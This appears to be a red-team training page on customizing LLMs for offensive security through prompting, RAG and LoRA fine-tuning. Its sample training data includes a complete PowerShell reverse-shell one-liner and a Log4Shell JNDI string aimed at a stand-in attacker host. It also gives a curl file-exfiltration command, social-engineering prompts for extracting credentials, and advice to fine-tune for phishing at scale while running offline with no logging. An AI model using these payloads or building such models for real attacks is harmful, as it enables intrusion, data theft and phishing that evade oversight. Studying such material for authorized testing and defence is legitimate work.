---
layout: training-page
title: "Fine-Tuning vs Prompt Engineering for Offensive AI — Red Team Academy"
module: "AI Red Team Agents"
tags:
  - ai
  - fine-tuning
  - prompt-engineering
  - lora
  - qlora
  - rag
  - llm-customization
page_key: "ai-fine-tuning-offsec"
render_with_liquid: false
---

# Fine-Tuning vs Prompt Engineering for Offensive AI

Two primary approaches exist for customizing LLMs for offensive security tasks: **prompt engineering** (shaping behavior through input design, no model changes) and **fine-tuning** (retraining the model on task-specific data). Choosing the right approach depends on task consistency requirements, available compute, operational security needs, and whether the model must run offline. A hybrid approach using RAG plus lightweight fine-tuning is often optimal.

## Definitions

| Technique | Description |
|-----------|-------------|
| **Prompt Engineering** | Designing input prompts to elicit desired output from a base LLM without altering internal weights |
| **Fine-Tuning** | Retraining an LLM on task-specific data, creating a specialized variant with improved performance |

## Prompt Engineering for Offensive Tasks

Prompt engineering is lightweight and cost-effective when the base model is capable enough. Compatible with closed-source models (GPT-4, Claude).

### Techniques

- **Zero-shot**: Provide task directly — no examples
- **Few-shot**: Include 1–3 examples of desired input/output pairs
- **Chain-of-thought**: Guide LLM through reasoning steps explicitly
- **RAG**: Inject external data chunks dynamically at query time

### Offensive Use Cases

```
# OSINT workflow
"Generate a recon plan for domain target.com using only passive tools."

# Vulnerability research
"List CVEs in Apache 2.4.52 that can lead to RCE."

# Payload crafting
"Generate a payload to exfiltrate /etc/passwd using Bash and curl."

# Privilege escalation guidance
"Based on this nmap scan output and whoami, suggest 3 privilege escalation techniques."

# Multi-turn social engineering
"You are a corporate IT helpdesk agent. The next message is from an employee who
has forgotten their password. Respond in a way that extracts their username."
```

### Chain-of-Thought for Exploit Research

```
# Let the model reason through an attack chain
"Think step by step. Given that the target runs Apache 2.4.52 on Ubuntu 22.04
with mod_ssl enabled, walk through how you would identify and exploit a
relevant vulnerability."
```

### RAG-Enhanced Prompt Engineering

```python
# Inject retrieved context from local knowledge base
from langchain.chains import RetrievalQA
from langchain.vectorstores import Chroma
from langchain.llms import OpenAI

vectorstore = Chroma(persist_directory="./exploit_db")
retriever = vectorstore.as_retriever(search_kwargs={"k": 5})

qa = RetrievalQA.from_chain_type(
    llm=OpenAI(),
    retriever=retriever,
    chain_type="stuff"
)

result = qa.run("What are the best privilege escalation techniques for Linux kernel 5.15?")
```

### Pros and Cons

**Pros**
- Fast iteration (minutes to set up)
- No training required
- Works with closed-source models
- Easy to pivot between tasks

**Cons**
- Model behavior may be inconsistent
- Vulnerable to prompt injection or drift
- Limited by token context window
- No persistent behavioral customization

## Fine-Tuning for Offensive Specialization

Fine-tuning is ideal for building offensive AI agents that perform consistently in red teaming environments. Best for internal knowledge encapsulation (PoCs, playbooks, tooling), persistent agents, and AI-driven adversarial simulation.

### Fine-Tuning Workflow

#### 1. Dataset Collection

Curate JSONL files with prompt/completion pairs from:
- Red team reports
- CVE exploitation steps
- Attack chains (MITRE TTPs)
- Tool usage examples (nmap, msfconsole, BloodHound)

```json
{"prompt": "How do I exploit CVE-2021-44228 (Log4Shell)?",
 "completion": "Send a crafted string like ${jndi:ldap://attacker.com/a} in HTTP headers.
The vulnerable Log4j instance will initiate an outbound LDAP lookup, leading to RCE."}

{"prompt": "Generate a PowerShell one-liner for a reverse shell.",
 "completion": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""}
```

#### 2. Preprocessing

Normalize formatting, remove noise, redact sensitive identifiers (PII, live credentials).

#### 3. Model Selection

Models supporting fine-tuning:
- `Mistral-7B` — good performance, small footprint
- `LLaMA2-7B/13B` — widely supported, strong base
- `OpenLLaMA` — fully open license
- `Falcon-7B` — good instruction following
- `GPT-J-6B` — older but well-understood

#### 4. Training with LoRA/QLoRA

LoRA (Low-Rank Adaptation) trains only small adapter layers — avoids full model retraining. QLoRA adds 4-bit quantization for efficiency on consumer hardware.

```bash
# Using Axolotl (recommended for LoRA fine-tuning)
pip install axolotl

# Configuration file (config.yaml)
# base_model: mistralai/Mistral-7B-v0.1
# adapter: lora
# lora_r: 8
# lora_alpha: 16
# dataset: path/to/red_team_data.jsonl
# num_epochs: 3

axolotl train config.yaml
```

```python
# Using HuggingFace Transformers + PEFT
from transformers import AutoModelForCausalLM, AutoTokenizer
from peft import LoraConfig, get_peft_model, TaskType

model = AutoModelForCausalLM.from_pretrained("mistralai/Mistral-7B-v0.1", load_in_4bit=True)
tokenizer = AutoTokenizer.from_pretrained("mistralai/Mistral-7B-v0.1")

lora_config = LoraConfig(
    task_type=TaskType.CAUSAL_LM,
    r=8,
    lora_alpha=16,
    target_modules=["q_proj", "v_proj"],
    lora_dropout=0.1,
)
model = get_peft_model(model, lora_config)
```

#### 5. Testing and Validation

Evaluate against real attack prompts. Check for:
- Hallucination rate (incorrect CVE numbers, wrong syntax)
- Instruction following consistency
- Resistance to prompt injection that tries to override fine-tuned behavior
- Output quality vs base model baseline

### Pros and Cons

**Pros**
- Consistent, specialized behavior across tasks
- Embeds organizational knowledge (custom playbooks, internal TTPs)
- Works fully offline — no API calls, no logging
- Higher quality output for domain-specific tasks

**Cons**
- Requires compute (GPU or cloud training budget)
- Hours to days setup time
- May memorize sensitive training data
- Not compatible with closed-source models
- Risk of model poisoning if training data is compromised

## Trade-Off Comparison

| Factor | Prompt Engineering | Fine-Tuning |
|--------|------------------|-------------|
| **Setup Time** | Minutes | Hours to days |
| **Cost** | Very Low | Medium to High |
| **Adaptability** | High | Medium |
| **Control** | Low | High |
| **Security Risk** | Prompt injection | Model poisoning |
| **Works with Closed Models** | Yes | No (unless API-supported) |
| **Offline Use** | Depends | Yes (open models) |
| **Best For** | Prototyping, versatility | Specialization, automation agents |

## Practical Comparison: Payload Suggestion

**Prompt Engineering** — requires detailed context each time:
```
"Generate a Bash command that exfiltrates files from /tmp to an external server.
Use curl and avoid obvious tool names."
```

**Fine-Tuned Model** — knows patterns from prior training data, needs less context:
```bash
curl -F "file=@/tmp/data.zip" http://attacker-ip/upload.php
```

## Hybrid Strategy: Prompt Tuning + RAG

Combine the strengths of both approaches:

```
Base model (open, e.g. Mistral)
  + Prompt engineering for task context
  + RAG for dynamic retrieval of playbooks/CVEs/TTPs
  + LoRA adapters to hardwire behavioral style

Ideal for:
  - Limited compute environments
  - Iterative development
  - Agents with memory + tool-use
```

```python
# Example hybrid agent
from langchain.llms import Ollama
from langchain.chains import RetrievalQA
from langchain.vectorstores import Chroma

# Local LLM (potentially LoRA fine-tuned via Ollama)
llm = Ollama(model="mistral-offensec")  # custom fine-tuned model

# RAG for dynamic context injection
vectorstore = Chroma(persist_directory="./red_team_kb")
retriever = vectorstore.as_retriever(search_kwargs={"k": 3})

qa_chain = RetrievalQA.from_chain_type(
    llm=llm,
    retriever=retriever,
    chain_type="stuff"
)
```

## Decision Guide

| Situation | Recommendation |
|-----------|---------------|
| Rapid prototyping OSINT agents | Prompt Engineering |
| Internal exploit database integration | Prompt + Embedding (RAG) |
| Persistent red team agent with custom TTPs | Fine-Tuning |
| Offline/local LLM customization | Fine-Tuning or LoRA |
| Budget/resource constrained workflows | Prompt Engineering |
| Consistent phishing content at scale | Fine-Tuning |
| Multi-target campaigns with variation | Prompt Engineering + RAG |

## Fine-Tuning Tools

| Tool | Use Case | Notes |
|------|----------|-------|
| **Axolotl** | LoRA fine-tuning, open models | Easy config, HuggingFace-based |
| **QLoRA** | Quantized training | Efficient for large models, consumer hardware |
| **HuggingFace Trainer** | Full fine-tuning or adapter-based | Largest ecosystem |
| **OpenLLM** | Deployment + serving | CLI + agent interface support |
| **LLaMA-Factory** | Multi-model fine-tuning | Supports LoRA, full fine-tune, QLoRA |
| **Ollama** | Local model serving + Modelfile customization | Fastest local inference |

## Security Considerations

- Fine-tuned models may **memorize sensitive training data** — test for extraction
- Test against adversarial prompts (prompt injection bypasses) before operational use
- Prefer **on-premise fine-tuning** when dealing with red team TTPs or exploits
- Never upload red team data to commercial fine-tuning APIs (OpenAI, Anthropic)
- LoRA adapters trained on malicious data can be distributed separately from the base model — treat adapters as sensitive artifacts

## Resources

- Axolotl — `github.com/OpenAccess-AI-Collective/axolotl`
- QLoRA — `github.com/artidoro/qlora`
- HuggingFace PEFT — `github.com/huggingface/peft`
- LLaMA-Factory — `github.com/hiyouga/LLaMA-Factory`
- Ollama — `ollama.ai`
- HuggingFace Model Hub — `huggingface.co/models`
